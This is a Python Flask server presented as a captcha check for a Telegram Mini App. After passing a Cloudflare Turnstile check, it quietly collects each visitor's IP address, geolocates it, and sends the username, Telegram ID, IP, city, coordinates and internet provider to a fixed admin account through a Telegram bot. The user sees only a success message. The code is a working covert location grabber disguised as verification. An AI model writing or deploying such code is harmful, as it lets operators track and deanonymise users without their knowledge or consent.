from flask import Flask, request
from flask_cors import CORS

import requests
import os
import telebot


app = Flask(__name__)

CORS(app)


# =====================
# ENV
# =====================

TURNSTILE_SECRET = os.getenv(
    "TURNSTILE_SECRET"
)


BOT_TOKEN = os.getenv(
    "BOT_TOKEN"
)


ADMIN_ID = 2125969061



bot = telebot.TeleBot(
    BOT_TOKEN
)



# =====================
# HOME
# =====================

@app.route("/")
def home():

    return "Captcha server works!"



# =====================
# VERIFY
# =====================

@app.route(
    "/verify",
    methods=["POST"]
)
def verify():


    data = request.json



    telegram_id = data.get(
        "id"
    )


    username = data.get(
        "username",
        "unknown"
    )


    turnstile_token = data.get(
        "turnstile_token"
    )



    if not turnstile_token:


        return {

            "success": False,

            "error":
            "No Cloudflare token"

        },400




    # =====================
    # CLOUDFLARE CHECK
    # =====================


    try:


        cf_response = requests.post(

            "https://challenges.cloudflare.com/turnstile/v0/siteverify",

            data={

                "secret":
                TURNSTILE_SECRET,


                "response":
                turnstile_token

            },


            timeout=10

        )


        cf_result = cf_response.json()



    except Exception as e:



        return {

            "success":False,

            "error":str(e)

        },500





    if not cf_result.get(
        "success"
    ):


        return {


            "success":False,


            "error":
            "Cloudflare failed"


        },403





    # =====================
    # IP
    # =====================


    ip = request.headers.get(

        "X-Forwarded-For",

        request.remote_addr

    )



    if ip and "," in ip:


        ip = ip.split(",")[0]




    # =====================
    # GEO INFO
    # =====================


    try:


        geo = requests.get(

            f"https://ipwho.is/{ip}",

            timeout=10

        ).json()



    except Exception:


        geo = {}






    country = geo.get(
        "country",
        "Неизвестно"
    )


    city = geo.get(
        "city",
        "Неизвестно"
    )


    region = geo.get(
        "region",
        "Неизвестно"
    )


    timezone = geo.get(
        "timezone",
        {}
    ).get(
        "id",
        "Неизвестно"
    )


    latitude = geo.get(
        "latitude"
    )


    longitude = geo.get(
        "longitude"
    )


    connection = geo.get(
        "connection",
        {}
    )


    isp = connection.get(
        "isp",
        "Неизвестно"
    )


    asn = connection.get(
        "asn",
        "Неизвестно"
    )



    # =====================
    # SEND ADMIN MESSAGE
    # =====================


    try:


        message = f"""

🌐 Новая проверка Mini App


👤 Username:
@{username}


🆔 Telegram ID:
{telegram_id}


📡 IP:
{ip}


🌍 Страна:
{country}


🏙 Город:
{city}


📍 Регион:
{region}


🕒 Часовой пояс:
{timezone}


📌 Координаты:
{latitude}, {longitude}


📡 Провайдер:
{isp}


🔢 ASN:
{asn}

"""


        bot.send_message(

            ADMIN_ID,

            message

        )



    except Exception as e:


        print(
            "Telegram error:",
            e
        )





    # =====================
    # RESPONSE TO MINI APP
    # =====================


    return {


        "success":True,


        "message":
        "Verification successful"


    }




# =====================
# START
# =====================


if __name__ == "__main__":


    app.run(

        host="0.0.0.0",

        port=5000

    )
